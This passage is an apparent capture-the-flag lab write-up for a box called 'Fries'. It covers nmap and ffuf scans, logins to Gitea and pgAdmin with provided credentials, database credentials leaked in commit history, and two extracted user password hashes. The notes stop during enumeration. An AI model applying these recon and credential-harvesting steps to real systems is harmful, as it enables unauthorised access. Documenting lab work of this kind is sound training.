Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : d.cooper@fries.htb / D4LE11maan!!

### Nmap
```
nmap -sV -sC -vv 10.129.244.72

---OUTPUT---
Nmap scan report for fries.htb (10.129.244.72)
Host is up, received echo-reply ttl 127 (0.026s latency).
Scanned at 2026-04-03 03:32:46 EDT for 93s
Not shown: 984 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 62  OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U=
|   256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 62  nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Welcome to Fries - Fries Restaurant
|_http-server-header: nginx/1.18.0 (Ubuntu)
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-03 14:32:58Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-03T14:34:20+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-18T05:39:19
| Not valid after:  2105-11-18T05:39:19
| MD5:     2410 a18d 14b3 7f5d 8e34 d144 0bac 6469
| SHA-1:   3e84 1436 bb47 6ccd f5ee f805 cacd 47b6 6485 7e09
| SHA-256: 11e5 64a5 9c40 cb95 6dd0 19ab d2bc 8a6f 9773 1138 bab8 e290 c1e9 7cba ea6b 7454
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITYQAAACgkBIm4DHPMcwABAAAAKDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRUwEwYKCZImiZPyLGQBGRYFZnJpZXMx
| FjAUBgNVBAMTDWZyaWVzLURDMDEtQ0EwIBcNMjUxMTE4MDUzOTE5WhgPMjEwNTEx
| MTgwNTM5MTlaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPpxCC
| aZWpQqWfYbE5TXkYhqP9hxJvhmYaiPe+peUBqDXSVkdoBGOt600NkzwyjrFZIJLE
| uceFPfxXD1fl1FENc+oEBbyt3EHEovDoJk+cY/45E6fe9C621W+z7bNvKbPxyuXa
| xkxjkxClaIrYHMgk96M6zdvr9AOOiX8UhPqoSeogF8JRuYHmOBImuY2yqr1eRrvH
| LfTfiHPUJR5W6TJ+Fhfz7N7tgo74ddW9WVT3sgvwbbHVUZOpr3XxBQdJRHyzv05Y
| F+KIK3gtn1UMh7pX1NTTIKO3cOiivZCcw+uodamORjrFKloFKpFHJairIDP5MQvG
| +ngp4j7SANPL4KntAgMBAAGjggMOMIIDCjA2BgkrBgEEAYI3FQcEKTAnBh8rBgEE
| AYI3FQiFyocNqsACgomNG8Off4K99k2BAQEhAgFuAgEAMDIGA1UdJQQrMCkGCCsG
| AQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8E
| BAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAM
| BgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFHdnDz/EL+Qpk3Bq1tnE
| qNe1qcmvMB8GA1UdIwQYMBaAFByH741F57ZStYVlo/TEvDOCG1KcMIHJBgNVHR8E
| gcEwgb4wgbuggbiggbWGgbJsZGFwOi8vL0NOPWZyaWVzLURDMDEtQ0EoMSksQ049
| REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vydmlj
| ZXMsQ049Q29uZmlndXJhdGlvbixEQz1mcmllcyxEQz1odGI/Y2VydGlmaWNhdGVS
| ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
| aW50MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NO
| PWZyaWVzLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZnJpZXMsREM9aHRiP2NB
| Q2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9y
| aXR5MC4GA1UdEQEB/wQkMCKCDkRDMDEuZnJpZXMuaHRigglmcmllcy5odGKCBUZS
| SUVTME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS04
| NTgzMzgzNDYtMzg2MTAzMDUxNi0zOTc1MjQwNDcyLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAHaVyk9K3fNRHrh+9cAwXe+jqDqd5iZPSuw6EVABWAdLg9L9r+9bejsO
| Uin7De6fHFHn9EFNM6SJ4fM+g6gnEXwoIuPqmulcE+4zj7U52blMchO/TAFb23HS
| 1bJqvBpy0il8TJfHg6cQs7/F4H5qOOHqTaeciKWnuUR4V3z69mhSMQezkVn7NrbG
| tkH7x05OzZ4slQO3ac3IRkKeRNiD/3gaqmiPEOtHWq11ulKg5ezwvh3fOT9mMCXH
| halJstv6Jh+Xse4ZFHey/dY4/oEqLcwHmnRzmEku2kJ5ND+N0N+oO0jfni6Lg7f5
| LlBoD6A7Z0XQ77rtTrk5tPjER7aq66k=
|_-----END CERTIFICATE-----
443/tcp  open  ssl/http      syn-ack ttl 62  nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/localityName=Madrid/emailAddress=web@fries.htb/organizationalUnitName=PWM Configuration
| Issuer: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP/localityName=Madrid/emailAddress=web@fries.htb/organizationalUnitName=PWM Configuration
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-01T22:06:09
| Not valid after:  2026-06-01T22:06:09
| MD5:     118d ea17 3fba 3b65 28de 8e26 33e7 19f2
| SHA-1:   5503 8aa8 0080 a853 ca73 87e3 b705 3fe8 b599 a855
| SHA-256: e645 33d9 d4b9 73b7 d46c 5fe1 aabc 4328 f458 d6df 2fc0 b92a 89a4 faf0 54c0 811d
| -----BEGIN CERTIFICATE-----
| MIIEGTCCAwGgAwIBAgIUW1MfdMXjo8YcnnMWmFQNMkXzkeAwDQYJKoZIhvcNAQEL
| BQAwgZsxCzAJBgNVBAYTAlNQMQ8wDQYDVQQIDAZNYWRyaWQxDzANBgNVBAcMBk1h
| ZHJpZDEYMBYGA1UECgwPRnJpZXMgRm9vZHMgTFREMRowGAYDVQQLDBFQV00gQ29u
| ZmlndXJhdGlvbjEWMBQGA1UEAwwNcHdtLmZyaWVzLmh0YjEcMBoGCSqGSIb3DQEJ
| ARYNd2ViQGZyaWVzLmh0YjAeFw0yNTA2MDEyMjA2MDlaFw0yNjA2MDEyMjA2MDla
| MIGbMQswCQYDVQQGEwJTUDEPMA0GA1UECAwGTWFkcmlkMQ8wDQYDVQQHDAZNYWRy
| aWQxGDAWBgNVBAoMD0ZyaWVzIEZvb2RzIExURDEaMBgGA1UECwwRUFdNIENvbmZp
| Z3VyYXRpb24xFjAUBgNVBAMMDXB3bS5mcmllcy5odGIxHDAaBgkqhkiG9w0BCQEW
| DXdlYkBmcmllcy5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC6
| 5V7dwNSFeKCUGSPuALuZyalQxLProDbZiTVQPJcNj6EmHLG1vxsqXpSrJhCb7dBh
| FiuU36jvy5hbxTgYJ/kXaPO83wAjaTkWe4Dv1cPXTtqyUTx4X9k3W+cU9Rf/Sr4M
| seK3Ub9+2TYaLxRNHwE+eQ+dJQ7/RQOeYZWGc9xEA4nlqwLpT52PCfftdMdZzxzG
| XBhf0TYloX5hLPpFvl/YyZ2foBdbHbODoyXmnvXlboCMlxnpNywyw0pV7DAa4cNk
| 2KZZXzHLvCZ+Ev1+yIt+19J6mFSdHMJjjKSB/fkMuXv2ZN3bTpbVkHz/ruaEG9u7
| MTulepgoLY3XzEKMcq1zAgMBAAGjUzBRMB0GA1UdDgQWBBRaBJosucIruiAxu5z0
| HgysCx0EpDAfBgNVHSMEGDAWgBRaBJosucIruiAxu5z0HgysCx0EpDAPBgNVHRMB
| Af8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAOewUzyifCBtN0FEuDGBX1Z3KY
| ih1AI0wHKhgbDl1HynxsrJ/W2dNtfNzRxDI7sHVN9YSulP+X06ByWwKpehlFbkiM
| DsYhnFsKtlYK/i10hqOynZ18CFvKkvStqfXXgaAQHyL0u12UiOBDM6Jwm/nNKqXx
| Qog6y2Hgi9WCclcYdwyKdiKdeiMz1b4yIIwDiZw01vGo/uyX+nDIsH/6OGbwI0yE
| +ajXRFITQz7FjkcXpqxncpSdDETi5uGse89ebqfnP2TSHRSQSmxmkNO4ZP0Mn9u7
| yQtdyRxIZrJPyWOeB7g3W/xo7BhUKs/tC8lAY3nA4PoDVMh49pyf/JNU8b8F
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-18T05:39:19
| Not valid after:  2105-11-18T05:39:19
| MD5:     2410 a18d 14b3 7f5d 8e34 d144 0bac 6469
| SHA-1:   3e84 1436 bb47 6ccd f5ee f805 cacd 47b6 6485 7e09
| SHA-256: 11e5 64a5 9c40 cb95 6dd0 19ab d2bc 8a6f 9773 1138 bab8 e290 c1e9 7cba ea6b 7454
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITYQAAACgkBIm4DHPMcwABAAAAKDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRUwEwYKCZImiZPyLGQBGRYFZnJpZXMx
| FjAUBgNVBAMTDWZyaWVzLURDMDEtQ0EwIBcNMjUxMTE4MDUzOTE5WhgPMjEwNTEx
| MTgwNTM5MTlaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPpxCC
| aZWpQqWfYbE5TXkYhqP9hxJvhmYaiPe+peUBqDXSVkdoBGOt600NkzwyjrFZIJLE
| uceFPfxXD1fl1FENc+oEBbyt3EHEovDoJk+cY/45E6fe9C621W+z7bNvKbPxyuXa
| xkxjkxClaIrYHMgk96M6zdvr9AOOiX8UhPqoSeogF8JRuYHmOBImuY2yqr1eRrvH
| LfTfiHPUJR5W6TJ+Fhfz7N7tgo74ddW9WVT3sgvwbbHVUZOpr3XxBQdJRHyzv05Y
| F+KIK3gtn1UMh7pX1NTTIKO3cOiivZCcw+uodamORjrFKloFKpFHJairIDP5MQvG
| +ngp4j7SANPL4KntAgMBAAGjggMOMIIDCjA2BgkrBgEEAYI3FQcEKTAnBh8rBgEE
| AYI3FQiFyocNqsACgomNG8Off4K99k2BAQEhAgFuAgEAMDIGA1UdJQQrMCkGCCsG
| AQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8E
| BAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAM
| BgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFHdnDz/EL+Qpk3Bq1tnE
| qNe1qcmvMB8GA1UdIwQYMBaAFByH741F57ZStYVlo/TEvDOCG1KcMIHJBgNVHR8E
| gcEwgb4wgbuggbiggbWGgbJsZGFwOi8vL0NOPWZyaWVzLURDMDEtQ0EoMSksQ049
| REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vydmlj
| ZXMsQ049Q29uZmlndXJhdGlvbixEQz1mcmllcyxEQz1odGI/Y2VydGlmaWNhdGVS
| ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
| aW50MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NO
| PWZyaWVzLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZnJpZXMsREM9aHRiP2NB
| Q2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9y
| aXR5MC4GA1UdEQEB/wQkMCKCDkRDMDEuZnJpZXMuaHRigglmcmllcy5odGKCBUZS
| SUVTME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS04
| NTgzMzgzNDYtMzg2MTAzMDUxNi0zOTc1MjQwNDcyLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAHaVyk9K3fNRHrh+9cAwXe+jqDqd5iZPSuw6EVABWAdLg9L9r+9bejsO
| Uin7De6fHFHn9EFNM6SJ4fM+g6gnEXwoIuPqmulcE+4zj7U52blMchO/TAFb23HS
| 1bJqvBpy0il8TJfHg6cQs7/F4H5qOOHqTaeciKWnuUR4V3z69mhSMQezkVn7NrbG
| tkH7x05OzZ4slQO3ac3IRkKeRNiD/3gaqmiPEOtHWq11ulKg5ezwvh3fOT9mMCXH
| halJstv6Jh+Xse4ZFHey/dY4/oEqLcwHmnRzmEku2kJ5ND+N0N+oO0jfni6Lg7f5
| LlBoD6A7Z0XQ77rtTrk5tPjER7aq66k=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-04-03T14:34:19+00:00; +7h00m00s from scanner time.
2179/tcp open  vmrdp?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-03T14:34:20+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-18T05:39:19
| Not valid after:  2105-11-18T05:39:19
| MD5:     2410 a18d 14b3 7f5d 8e34 d144 0bac 6469
| SHA-1:   3e84 1436 bb47 6ccd f5ee f805 cacd 47b6 6485 7e09
| SHA-256: 11e5 64a5 9c40 cb95 6dd0 19ab d2bc 8a6f 9773 1138 bab8 e290 c1e9 7cba ea6b 7454
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITYQAAACgkBIm4DHPMcwABAAAAKDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRUwEwYKCZImiZPyLGQBGRYFZnJpZXMx
| FjAUBgNVBAMTDWZyaWVzLURDMDEtQ0EwIBcNMjUxMTE4MDUzOTE5WhgPMjEwNTEx
| MTgwNTM5MTlaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPpxCC
| aZWpQqWfYbE5TXkYhqP9hxJvhmYaiPe+peUBqDXSVkdoBGOt600NkzwyjrFZIJLE
| uceFPfxXD1fl1FENc+oEBbyt3EHEovDoJk+cY/45E6fe9C621W+z7bNvKbPxyuXa
| xkxjkxClaIrYHMgk96M6zdvr9AOOiX8UhPqoSeogF8JRuYHmOBImuY2yqr1eRrvH
| LfTfiHPUJR5W6TJ+Fhfz7N7tgo74ddW9WVT3sgvwbbHVUZOpr3XxBQdJRHyzv05Y
| F+KIK3gtn1UMh7pX1NTTIKO3cOiivZCcw+uodamORjrFKloFKpFHJairIDP5MQvG
| +ngp4j7SANPL4KntAgMBAAGjggMOMIIDCjA2BgkrBgEEAYI3FQcEKTAnBh8rBgEE
| AYI3FQiFyocNqsACgomNG8Off4K99k2BAQEhAgFuAgEAMDIGA1UdJQQrMCkGCCsG
| AQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8E
| BAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAM
| BgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFHdnDz/EL+Qpk3Bq1tnE
| qNe1qcmvMB8GA1UdIwQYMBaAFByH741F57ZStYVlo/TEvDOCG1KcMIHJBgNVHR8E
| gcEwgb4wgbuggbiggbWGgbJsZGFwOi8vL0NOPWZyaWVzLURDMDEtQ0EoMSksQ049
| REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vydmlj
| ZXMsQ049Q29uZmlndXJhdGlvbixEQz1mcmllcyxEQz1odGI/Y2VydGlmaWNhdGVS
| ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
| aW50MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NO
| PWZyaWVzLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZnJpZXMsREM9aHRiP2NB
| Q2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9y
| aXR5MC4GA1UdEQEB/wQkMCKCDkRDMDEuZnJpZXMuaHRigglmcmllcy5odGKCBUZS
| SUVTME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS04
| NTgzMzgzNDYtMzg2MTAzMDUxNi0zOTc1MjQwNDcyLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAHaVyk9K3fNRHrh+9cAwXe+jqDqd5iZPSuw6EVABWAdLg9L9r+9bejsO
| Uin7De6fHFHn9EFNM6SJ4fM+g6gnEXwoIuPqmulcE+4zj7U52blMchO/TAFb23HS
| 1bJqvBpy0il8TJfHg6cQs7/F4H5qOOHqTaeciKWnuUR4V3z69mhSMQezkVn7NrbG
| tkH7x05OzZ4slQO3ac3IRkKeRNiD/3gaqmiPEOtHWq11ulKg5ezwvh3fOT9mMCXH
| halJstv6Jh+Xse4ZFHey/dY4/oEqLcwHmnRzmEku2kJ5ND+N0N+oO0jfni6Lg7f5
| LlBoD6A7Z0XQ77rtTrk5tPjER7aq66k=
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fries.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-03T14:34:19+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Issuer: commonName=fries-DC01-CA/domainComponent=fries
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-18T05:39:19
| Not valid after:  2105-11-18T05:39:19
| MD5:     2410 a18d 14b3 7f5d 8e34 d144 0bac 6469
| SHA-1:   3e84 1436 bb47 6ccd f5ee f805 cacd 47b6 6485 7e09
| SHA-256: 11e5 64a5 9c40 cb95 6dd0 19ab d2bc 8a6f 9773 1138 bab8 e290 c1e9 7cba ea6b 7454
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITYQAAACgkBIm4DHPMcwABAAAAKDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRUwEwYKCZImiZPyLGQBGRYFZnJpZXMx
| FjAUBgNVBAMTDWZyaWVzLURDMDEtQ0EwIBcNMjUxMTE4MDUzOTE5WhgPMjEwNTEx
| MTgwNTM5MTlaMAAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPpxCC
| aZWpQqWfYbE5TXkYhqP9hxJvhmYaiPe+peUBqDXSVkdoBGOt600NkzwyjrFZIJLE
| uceFPfxXD1fl1FENc+oEBbyt3EHEovDoJk+cY/45E6fe9C621W+z7bNvKbPxyuXa
| xkxjkxClaIrYHMgk96M6zdvr9AOOiX8UhPqoSeogF8JRuYHmOBImuY2yqr1eRrvH
| LfTfiHPUJR5W6TJ+Fhfz7N7tgo74ddW9WVT3sgvwbbHVUZOpr3XxBQdJRHyzv05Y
| F+KIK3gtn1UMh7pX1NTTIKO3cOiivZCcw+uodamORjrFKloFKpFHJairIDP5MQvG
| +ngp4j7SANPL4KntAgMBAAGjggMOMIIDCjA2BgkrBgEEAYI3FQcEKTAnBh8rBgEE
| AYI3FQiFyocNqsACgomNG8Off4K99k2BAQEhAgFuAgEAMDIGA1UdJQQrMCkGCCsG
| AQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8BAf8E
| BAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAM
| BgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFHdnDz/EL+Qpk3Bq1tnE
| qNe1qcmvMB8GA1UdIwQYMBaAFByH741F57ZStYVlo/TEvDOCG1KcMIHJBgNVHR8E
| gcEwgb4wgbuggbiggbWGgbJsZGFwOi8vL0NOPWZyaWVzLURDMDEtQ0EoMSksQ049
| REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vydmlj
| ZXMsQ049Q29uZmlndXJhdGlvbixEQz1mcmllcyxEQz1odGI/Y2VydGlmaWNhdGVS
| ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
| aW50MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NO
| PWZyaWVzLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZnJpZXMsREM9aHRiP2NB
| Q2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9y
| aXR5MC4GA1UdEQEB/wQkMCKCDkRDMDEuZnJpZXMuaHRigglmcmllcy5odGKCBUZS
| SUVTME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS04
| NTgzMzgzNDYtMzg2MTAzMDUxNi0zOTc1MjQwNDcyLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAHaVyk9K3fNRHrh+9cAwXe+jqDqd5iZPSuw6EVABWAdLg9L9r+9bejsO
| Uin7De6fHFHn9EFNM6SJ4fM+g6gnEXwoIuPqmulcE+4zj7U52blMchO/TAFb23HS
| 1bJqvBpy0il8TJfHg6cQs7/F4H5qOOHqTaeciKWnuUR4V3z69mhSMQezkVn7NrbG
| tkH7x05OzZ4slQO3ac3IRkKeRNiD/3gaqmiPEOtHWq11ulKg5ezwvh3fOT9mMCXH
| halJstv6Jh+Xse4ZFHey/dY4/oEqLcwHmnRzmEku2kJ5ND+N0N+oO0jfni6Lg7f5
| LlBoD6A7Z0XQ77rtTrk5tPjER7aq66k=
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52994/tcp): CLEAN (Timeout)
|   Check 2 (port 16540/tcp): CLEAN (Timeout)
|   Check 3 (port 33740/udp): CLEAN (Timeout)
|   Check 4 (port 24204/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-04-03T14:33:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
```

- Dual layer..Target is fries.htb with DC dc01.fries.htb and a linux frontend with port 22 and 80 open.

### port 80
![[Pasted image 20260403033845.png]]

### Ffuf
- ffuf reveals another sublink:
```
ffuf -u http://fries.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -H "Host:FUZZ.fries.htb" -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Duration: 52ms]
:: Progress: [20481/20481] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

- I add to `/etc/hosts`
- Leads to a Gitea page:
![[Pasted image 20260403034251.png]]
- Users dale and admin exist here.
- Using the given credentials we can log in : `d.cooper@fries.htb`:`D4LE11maan!!`
- This reveals a repo:
![[Pasted image 20260403034800.png]]
- Looking at the commits I find some information:
	- Another subdomain : `db-mgmt05.fries.htb`
	- DB name (PostgreSQL): `ps_db`
	- Some credentials:
		- `DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db`
		- `SECRET_KEY=y0st528wn1idjk3b9a

- Looking back at nmap scan I also see other subdomains : `pwm.fries.htb`. Not really sure if needed to add in /etc/hsots but even without can access via https url to fries.htb with email web@fries.htb:
- This leads to a Password Manager:
![[Pasted image 20260403041601.png]]

- I try d.coopers credentials but it fails with an interesting error talking of user `svc_infra`
![[Pasted image 20260403041547.png]]

- Theres also a crednetial manager button which leads here: `https://fries.htb/pwm/private/config/login`
![[Pasted image 20260403041703.png]]

- Going back to what we found in Gitea the newly found subdomain leads to a new login page:
![[Pasted image 20260403042915.png]]

 - `d.cooper`'s credentials work here too:
![[Pasted image 20260403043139.png]]

- I am then prompted by the psql password when selecting the db on the left:
![[Pasted image 20260403044419.png]]
![[Pasted image 20260403044450.png]]

- I find some hashes under `gitea/public/tables/user` (right click > scripts > inset select and run)
![[Pasted image 20260403045048.png]]

- Hashes :
	- `administrator`:`67faad48c47a340b45ca87fa1dc4d048ce6b41bb6fae6b555240f1ffdc31367ddb8430a46811a7d402618aec8cce4f00143e`
	- `dale`:`8ba77f28df211ea62db7fbecbfb595cd0568f9e34e0832ae87dfa45154f592eff45453041f1c1b7cc46dc62b94cb70abc67e`

- I also check version of pgAdmin 4 :`9.1`
![[Pasted image 20260403045537.png]]

